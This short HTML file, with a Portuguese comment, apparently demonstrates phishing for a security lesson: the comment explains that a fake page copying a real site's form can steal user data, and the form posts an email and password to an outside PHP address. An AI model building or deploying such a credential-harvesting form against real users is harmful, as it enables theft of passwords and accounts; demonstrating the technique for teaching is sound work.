<!-- 
	Essa página simula uma página falsa da web que contém um formulário 
	identico ao site que o usuário queria acessar. Bastando apenas inserirmos a acton apontando
	para um site específico, os dados do usuário podem ser roubados.
-->



<form method='POST' action="https://b7web.com.br/seg/form_online.php">
	Email:<br/>
	<input type="email" name="email" /><br/><br/>

	Senha:<br/>
	<input type="password" name="senha" /><br/><br/>
	<input type="submit" value="Enviar" />
</form>